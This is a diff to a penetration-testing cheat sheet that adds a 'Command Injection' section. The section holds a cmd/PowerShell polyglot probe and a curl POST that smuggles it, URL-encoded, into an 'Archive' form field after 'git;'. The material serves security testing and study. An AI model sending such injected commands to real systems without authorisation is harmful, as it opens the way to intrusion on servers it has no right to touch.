@@ -72,6 +72,7 @@
 		- [WPScan](#wpscan)
 		- [XML External Entity (XXE)](#xml-external-entity-xxe)
   		- [Path Traversal](#path-traversal)
+    		- [Command Injection](#command-injection)  
 	- [Database Analysis](#database-analysis)
  		- [impacket-mssqlclient](#impacket-mssqlclient)
 		- [MongoDB](#mongodb)
@@ -3551,6 +3552,19 @@ Windows
 ```c
 C:\inetpub\logs\LogFiles\W3SVC1\
 C:\inetpub\wwwroot\web.config
+```
+
+#### Command Injection
+
+En Windows to see if the commands are executed in cmd or pwsh
+```c
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+```
+
+Url ecoded
+
+```c
+curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://LOCALIP:PORT/file
 ```
 
 ##### Shells on Web
